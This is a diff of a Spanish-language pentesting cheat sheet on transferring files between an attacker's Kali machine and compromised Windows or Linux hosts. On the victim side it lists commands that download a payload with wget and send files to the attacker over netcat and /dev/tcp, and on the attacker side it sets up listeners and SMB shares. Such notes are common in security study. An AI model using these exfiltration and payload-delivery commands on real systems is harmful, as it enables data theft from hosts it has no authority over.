@@ -15,7 +15,9 @@ C:\Windows\Temp
 ```bash 
 # Atacante Linux
 2. ❯ python -m SimpleHTTPServer 80      # Crear un servidor para tranferir archivos a Windows
+
 3. ❯ python3 -m http.server 80          # Crear un servidor para tranferir archivos a Windows
+
 4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Crear un server para tranferir archivos a Windows
 ```
 
@@ -70,8 +72,11 @@ C:\Windows\Temp
 # Atacante Linux
 
 1. ❯ python3 -m http.server 80          # Creamos un servidor para poder pasar los archivos a la maquina Linux
+
 2. ❯ nc -nlvp 443 > file.zip            # Se hace esto para descargar un archivo de la maquina victima con Netcat
+
 3. ❯ base64 -w 0 script.sh | xclip -sel clip      # Transferir un script cuando no existe nano, nvim, trasformamos a base64 y lo copiamos a la clipboard
+
 4. ❯ nc -nlvp 443 > file                # Recibir la data 
 ```
 
@@ -79,8 +84,11 @@ C:\Windows\Temp
 # Victima Linux
 
 1. ❯ wget http://IP/payload.sh              # Para descargar el payload de la maquina Linux
+
 2. ❯ nc IP 443 < File.zip                   # Para pasar un archivo a la maquina de atacante 
+
 3. ❯ echo abcdef | base64 -d > script.sh    # Pegamos el contenido anterior en 'base64', lo decodeamos y guardamos 
+
 4. ❯ cat < file.txt > /dev/tcp/IP/443        # Compartir un archivo 
 ```
 
@@ -111,14 +119,19 @@ C:\Windows\Temp
 	# dir = Directorio en donde se colocara el archivo 
 
 2. ❯ scp user@IP:/dir/destino/ .    # Copiar un archivo que se encuentra en la maquina Linux a Windows    
+
 3. ❯ python3 -m http.server 80      # Creamos un servidor 
-4. ❯ copy \\IP\smbFolder\file.exe   # Copiar el archivo desde Windows a Kali 
+
+4. ❯ copy \\IP_Kali\smbFolder\file.exe      # Copiar de Kali a Windows 
+4  ❯ copy .\file.exe \\IP_Kali\smbFolder\   # Copiar de Windows a Kali
 ```
 
 ```bash 
 # En linux
-3. ❯ http://IP          # Ingresamos desde el navegador web, colocamos la IP que se esta compartiendo y descargamos el recurso  
-4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support     # Recurso compartido para recibir el archivo 
+3. ❯ http://IP    # Ingresar desde el navegador web, colocar la IP que se esta compartiendo y descargar el recurso  
+
+# Recurso compartido para compartir o recibir un archivo 
+4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support     
 ```
 
 ## Certutil 
